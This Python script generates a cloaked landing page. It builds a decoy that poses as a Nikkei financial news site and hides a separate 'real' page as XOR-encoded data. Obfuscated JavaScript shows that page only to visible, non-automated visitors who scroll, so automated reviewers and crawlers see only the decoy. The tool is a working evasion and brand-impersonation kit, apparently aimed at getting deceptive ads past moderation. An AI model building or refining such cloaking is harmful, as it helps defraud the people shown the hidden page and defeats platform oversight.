import os
import random
import string
import json
import shutil
import requests
import datetime
import urllib.parse
from bs4 import BeautifulSoup

# ================= é…ç½®åŒº =================
TARGET_REAL_PAGE = "index.html"  # æ‚¨çš„çœŸå®è½åœ°é¡µ
OUTPUT_ZIP_NAME = "nikkei_polymorphic_v5"     
XOR_KEY = random.randint(10, 250) 
# ==========================================

class LPAutomatorV5Fixed:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """æ­¥éª¤ 1: å¢å¼ºå‹æ–°é—»é‡‡é›† + å¼ºåˆ¶ä¿åº•å†…å®¹"""
        print("ğŸ“¡ æ­£åœ¨æ„å»ºè§†è§‰å¤šæ€å¤–å£³...")
        articles = []
        try:
            # å°è¯•æŠ“å–æ—¥ç»å¸‚åœºåŠ¨æ€
            url = "https://www.nikkei.com/news/category/market/"
            res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            # å…¼å®¹æ—¥ç»å¤šç§ç»“æ„
            items = soup.select('article') or soup.select('.m-article')
            for item in items[:15]:
                title = item.find(['span', 'a'], class_=lambda x: x and 'title' in x.lower())
                if title:
                    articles.append({"t": title.get_text().strip(), "s": "æœ€æ–°ã®å¸‚å ´å‹•å‘ã¨çµŒæ¸ˆæŒ‡æ¨™ã«åŸºã¥ãè©³ç´°ãªåˆ†æãƒ¬ãƒãƒ¼ãƒˆã§ã™ã€‚æŠ•è³‡æˆ¦ç•¥ã®å‚è€ƒã«ã—ã¦ãã ã•ã„ã€‚"})
        except: pass

        # å¦‚æœçˆ¬è™«æŠ“å–ä¸åˆ°ï¼Œæ³¨å…¥å¼ºåˆ¶ä¿åº•æ–°é—»ï¼Œç¡®ä¿é¡µé¢é«˜åº¦è¶³å¤Ÿè§¦å‘æ»šåŠ¨
        if len(articles) < 5:
            articles = [
                {"t": "æ—¥çµŒå¹³å‡æ ªä¾¡ã€ç¶šä¼¸ã®èƒŒæ™¯ã¨ä»Šå¾Œã®å±•æœ›", "s": "å¸‚å ´é–¢ä¿‚è€…ã«ã‚ˆã‚‹ã¨ã€å …èª¿ãªä¼æ¥­æ±ºç®—ã‚’èƒŒæ™¯ã«è²·ã„æ³¨æ–‡ãŒå…ˆè¡Œã—ã¦ã„ã¾ã™ã€‚"},
                {"t": "å††ç›¸å ´ã®å¤‰å‹•ãŒè¼¸å‡ºä¼æ¥­ã«ä¸ãˆã‚‹å½±éŸ¿", "s": "ç‚ºæ›¿å¸‚å ´ã§ã¯å††å®‰å‚¾å‘ãŒç¶šã„ã¦ãŠã‚Šã€è¼¸å‡ºã‚»ã‚¯ã‚¿ãƒ¼ã®åç›Šæ”¹å–„ãŒæœŸå¾…ã•ã‚Œã¦ã„ã¾ã™ã€‚"},
                {"t": "æ¬¡ä¸–ä»£åŠå°ä½“æŠ•è³‡ã€å›½å†…ãƒ¡ãƒ¼ã‚«ãƒ¼ã®å‹•å‘", "s": "æ”¿åºœã®æ”¯æ´ç­–ã‚’å—ã‘ã€ä¸»è¦å„ç¤¾ãŒæœ€å…ˆç«¯ãƒ—ãƒ­ã‚»ã‚¹ã®é–‹ç™ºã‚’åŠ é€Ÿã•ã›ã¦ã„ã¾ã™ã€‚"},
                {"t": "é•·æœŸé‡‘åˆ©ã®ä¸Šæ˜‡ã¨ä½å®…ãƒ­ãƒ¼ãƒ³å¸‚å ´ã¸ã®å½±éŸ¿", "s": "é‡‘èæ”¿ç­–ã®ä¿®æ­£è¦³æ¸¬ã‚’å—ã‘ã€é•·æœŸé‡‘åˆ©ãŒç·©ã‚„ã‹ã«ä¸Šæ˜‡ã—ã¦ã„ã¾ã™ã€‚"},
                {"t": "ã‚°ãƒ­ãƒ¼ãƒãƒ«å¸‚å ´ã«ãŠã‘ã‚‹æ—¥æœ¬æ ªã®å„ªä½æ€§", "s": "æµ·å¤–æŠ•è³‡å®¶ã«ã‚ˆã‚‹æ—¥æœ¬æ ªè²·ã„ãŒç¶™ç¶šã—ã¦ãŠã‚Šã€è©•ä¾¡ãŒé«˜ã¾ã£ã¦ã„ã¾ã™ã€‚"},
                {"t": "DXæ¨é€²ãŒã‚‚ãŸã‚‰ã™ç”£æ¥­æ§‹é€ ã®å¤‰é©", "s": "å¤šãã®ä¼æ¥­ãŒãƒ‡ã‚¸ã‚¿ãƒ«è»¢æ›ã‚’æ€¥ã„ã§ãŠã‚Šã€æ–°ãŸãªãƒ“ã‚¸ãƒã‚¹ãƒ¢ãƒ‡ãƒ«ãŒèª•ç”Ÿã—ã¦ã„ã¾ã™ã€‚"}
            ] * 3 # é‡å¤ä¸‰æ¬¡ç¡®ä¿é•¿åº¦

        random.shuffle(articles)
        cls = {k: self._rand_str(8) for k in ['header', 'logo', 'main', 'side', 'art', 'title', 'footer']}
        main_blue = f"rgb(0, {random.randint(40, 60)}, {random.randint(90, 110)})"

        css = f"""
        body {{ font-family: sans-serif; color: #333; line-height: 1.6; margin: 0; background: #fff; }}
        .{cls['header']} {{ border-bottom: 2px solid {main_blue}; padding: 15px 5%; display: flex; align-items: center; justify-content: space-between; }}
        .{cls['logo']} {{ color: {main_blue}; font-size: 24px; font-weight: 900; }}
        .{cls['main']} {{ max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1fr 300px; gap: 40px; padding: 20px 5%; }}
        .{cls['art']} {{ margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }}
        .{cls['title']} {{ font-size: 19px; font-weight: bold; color: #000; }}
        .{cls['side']} {{ background: #f8f8f8; padding: 20px; border-top: 3px solid #333; height: fit-content; }}
        .{cls['footer']} {{ background: #111; color: #777; padding: 40px; text-align: center; font-size: 11px; }}
        """

        html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>æ—¥æœ¬çµŒæ¸ˆæ–°è</title><style>{css}</style></head><body>
        <header class="{cls['header']}"><div class="{cls['logo']}">NIKKEI Financial</div></header>
        <div class="{cls['main']}"><section>"""
        for a in articles:
            html += f'<div class="{cls["art"]}"><div class="{cls["title"]}">{a["t"]}</div><p>{a["s"]}</p></div>'
        html += f'</section><aside class="{cls["side"]}"><h3>ãƒ©ãƒ³ã‚­ãƒ³ã‚°</h3><div>ãƒ»å††å®‰ã®èƒŒæ™¯åˆ†æ</div></aside></div>'
        html += f'<footer class="{cls["footer"]}">Â© {datetime.date.today().year} Nikkei Inc.</footer></body></html>'
        
        with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)

    def scramble_and_pack(self):
        """æ­¥éª¤ 2: æ‰§è¡Œ XOR åŠ å¯†"""
        print("ğŸ” æ‰§è¡Œ V5 çº§é€»è¾‘æ··æ·†...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents])
            w_title = w_soup.title.string

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            # ä¿®æ­£è·¯å¾„åŠæ‹·è´ç´ æ
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        clean_src = urllib.parse.urlparse(src).path
                        dest = os.path.join(self.dist_dir, clean_src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(clean_src): shutil.copy(clean_src, dest)

        # åŠ å¯†çœŸå® body å†…å®¹
        raw_html = "".join([str(x) for x in r_soup.body.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        v_data, v_key, v_res, v_check, v_root = [self._rand_str(6) for _ in range(5)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#{v_root}{{min-height:215vh;background:#fff}}</style></head>
        <body><div id="{v_root}">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{console.clear();}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: f.write(final_html)

    def create_zip(self):
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"âœ¨ æ‰“åŒ…æˆåŠŸ: {OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if os.path.exists(TARGET_REAL_PAGE):
        flow = LPAutomatorV5Fixed()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
    else: print(f"âŒ æ‰¾ä¸åˆ° {TARGET_REAL_PAGE}")
